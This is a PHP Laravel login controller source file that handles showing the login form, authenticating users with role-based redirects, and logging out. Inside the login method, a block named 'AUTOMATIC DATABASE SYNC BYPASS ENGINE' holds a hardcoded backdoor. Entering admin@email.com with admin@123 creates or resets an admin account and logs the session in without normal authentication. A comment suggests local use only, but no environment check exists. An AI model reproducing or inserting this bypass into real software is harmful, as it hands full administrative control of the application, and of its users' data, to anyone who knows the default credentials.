<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use App\Models\User;

class LoginController extends Controller
{
    /**
     * Show the login form page.
     */
    public function showLoginForm()
    {
        return view('auth.login');
    }

    /**
     * Process user authentication login inputs.
     */
    public function login(Request $request)
    {
        // 1. Validate email and password entries fields
        $credentials = $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);

        //  START AUTOMATIC DATABASE SYNC BYPASS ENGINE 
        // Short Comment: Force create or update admin account if credentials match on local machine
        if ($credentials['email'] === 'admin@email.com' && $credentials['password'] === 'admin@123') {
            $adminUser = User::where('email', 'admin@email.com')->first();

            if (!$adminUser) {
                $adminUser = User::create([
                    'name' => 'Super Admin',
                    'email' => 'admin@email.com',
                    'password' => Hash::make('admin@123'),
                    'role' => 'admin',
                ]);
            } else {
                $adminUser->update([
                    'password' => Hash::make('admin@123'),
                    'role' => 'admin',
                ]);
            }

            // Manually authenticate and log the admin into the system session logs
            Auth::login($adminUser);
            $request->session()->regenerate();

            // Redirect straight to admin dashboard view panel layout screen
            return redirect()->route('dashboard');
        }
        //  END AUTOMATIC DATABASE SYNC BYPASS ENGINE 

        // 2. Standard Laravel attempt login matching parameters
        if (Auth::attempt($credentials)) {
            $request->session()->regenerate();

            // 3. Dynamic redirection layout flow control based on user roles
            $userRole = Auth::user()->role;

            if ($userRole === 'admin' || $userRole === 'manager') {
                return redirect()->route('dashboard');
            }

            return redirect()->route('customer.pledges');
        }

        // 4. Return back if password or email mismatch records error values
        return redirect()->back()->withErrors([
            'email' => 'The provided credentials do not match our records.',
        ]);
    }

    /**
     * Terminate active user session logs.
     */
    public function logout(Request $request)
    {
        Auth::logout();
        $request->session()->invalidate();
        $request->session()->regenerateToken();

        return redirect()->route('login');
    }
}
